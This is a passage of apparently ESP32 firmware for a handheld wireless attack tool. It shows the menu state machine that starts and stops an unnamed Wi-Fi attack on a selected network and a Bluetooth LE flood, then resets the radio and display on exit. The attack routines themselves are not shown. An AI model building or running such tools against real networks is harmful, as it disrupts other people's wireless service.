                }

                if (backClicked) {
                    clearButtonEvents();
                    currentState = STATE_WIFI_LIST;
                    needFullRedraw = true;
                }

                if (currentState == STATE_ATTACK_MENU) {
                    renderAttackMenu();
                }
                break;
            }

            case STATE_ATTACK_RUNNING: {
                handleAttackExecution();

                if (backClicked) {
                    clearButtonEvents();
                    stopAttack();
                    currentState = STATE_ATTACK_MENU;
                    needFullRedraw = true;
                }

                if (currentState == STATE_ATTACK_RUNNING) {
                    renderAttackRunning();
                }
                break;
            }

            case STATE_BLE_FLOOD: {
                updateBLEFlood();

                if (backClicked) {
                    clearButtonEvents();
                    stopBLEFlood();
                    currentState = STATE_MAIN_MENU;
                    needFullRedraw = true;
                }

                if (currentState == STATE_BLE_FLOOD) {
                    renderBLEFlood();
                }
                break;
            }
        }

        // Keep FreeRTOS watchdog happy and give SPI display bus breathing room
        delay(12);
    }

    // Cleanup before exiting back to Home screen
    if (attackRunning) {
        stopAttack();
    }
    if (bleActive) {
        stopBLEFlood();
    }

    WiFi.mode(WIFI_OFF);
    delay(50);
    WiFi.mode(WIFI_STA);

    // Restore portrait rotation for Home & Apps pages
    tft.setRotation(0);
}